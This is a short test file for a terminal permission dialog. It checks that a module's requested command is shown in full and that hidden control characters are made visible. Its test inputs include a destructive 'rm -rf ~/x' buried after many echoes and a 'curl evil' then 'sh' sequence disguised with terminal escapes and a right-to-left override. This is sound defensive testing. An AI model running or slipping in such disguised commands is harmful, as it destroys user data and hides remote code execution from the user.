import { describe, expect, it } from "vitest";
import { commandLines } from "../src/workspace/permdialog";

describe("the command a module wants to run in your terminal (workspace/permdialog.ts)", () => {
  it("is shown whole, with what you couldn't see made visible (Fable pass 24/11)", () => {
    const cmd = Array.from({ length: 12 }, (_, i) => `echo line${i}`).join(" ; ") + " ; rm -rf ~/x";
    const lines = commandLines(cmd, 30);
    expect(lines.length).toBeGreaterThan(6);
    expect(lines.join(" ")).toContain("rm -rf ~/x");
    const hidden = commandLines("ls\r\x1b[2Kcurl evil\nsh‮", 80).join("");
    expect(hidden).toContain("^M");
    expect(hidden).toContain("^[");
    expect(hidden).toContain("⏎");
    expect(hidden).toContain("<U+202E>");
    expect(hidden).not.toMatch(/[\x00-\x1f‮]/);
  });
});
